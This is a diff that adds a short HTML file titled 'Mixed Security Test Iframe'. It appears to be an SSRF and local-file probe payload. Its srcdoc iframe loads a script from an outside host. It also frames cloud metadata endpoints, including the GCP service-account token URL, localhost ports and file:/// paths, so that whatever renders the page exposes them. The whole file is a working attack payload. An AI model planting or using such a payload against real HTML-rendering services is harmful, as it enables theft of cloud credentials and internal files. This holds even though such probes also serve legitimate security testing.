@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Mixed Security Test Iframe</title>
+</head>
+<body>
+  <iframe srcdoc='<script src="https://donreddy.vercel.app"></script><iframe src="http://instance-data/latest/meta-data/" width="33%" height="33%"></iframe><iframe src="http://127.0.0.1:443/" width="33%" height="33%"></iframe><iframe src="http://127.0.0.1:80/" width="33%" height="33%"></iframe><iframe src="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token" title="GCP Token Test" width="33%" height="33%"></iframe><iframe src="file:///" width="33%" height="33%"></iframe><iframe src="file:///var/www/html/" width="33%" height="33%"></iframe>'></iframe>
+</body>
+</html>
